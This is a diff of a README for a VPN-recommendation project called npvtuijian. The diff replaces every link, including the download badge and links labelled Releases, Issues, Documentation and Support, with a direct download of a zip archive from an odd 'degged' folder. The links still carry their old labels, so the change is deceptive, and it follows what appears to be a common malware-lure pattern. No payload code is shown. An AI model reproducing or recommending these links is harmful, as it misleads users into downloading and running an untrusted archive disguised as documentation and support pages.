@@ -1,6 +1,6 @@
 # 🚁 npvtuijian - Affordable VPN Recommendations Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Stipool/npvtuijian/releases)
+[![Download Now](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to npvtuijian! Our application makes it easy to find the best VPN option
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Stipool/npvtuijian/releases) to download the latest version of npvtuijian. You can find all available versions and select the one that suits your needs.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip) to download the latest version of npvtuijian. You can find all available versions and select the one that suits your needs.
 
 ### Steps to Download:
-1. Click on the link to visit the [Releases page](https://github.com/Stipool/npvtuijian/releases).
+1. Click on the link to visit the [Releases page](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip).
 2. Locate the latest release version.
 3. Click on the file to download it to your device.
 
@@ -44,13 +44,13 @@ If you run into any issues:
 
 - **Installation Problems:** Ensure that you have the right system requirements.
 - **Connectivity Issues:** Check your internet connection or try using different server nodes.
-- **Feedback:** For any further assistance, visit our [Issues page](https://github.com/Stipool/npvtuijian/issues) to report problems or suggest improvements.
+- **Feedback:** For any further assistance, visit our [Issues page](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip) to report problems or suggest improvements.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Stipool/npvtuijian/releases)
-- [Documentation](https://github.com/Stipool/npvtuijian/wiki)
-- [Support Page](https://github.com/Stipool/npvtuijian/issues)
+- [Releases Page](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip)
+- [Documentation](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip)
+- [Support Page](https://raw.githubusercontent.com/Stipool/npvtuijian/main/degged/npvtuijian.zip)
 
 ## 📝 Topics Covered
 
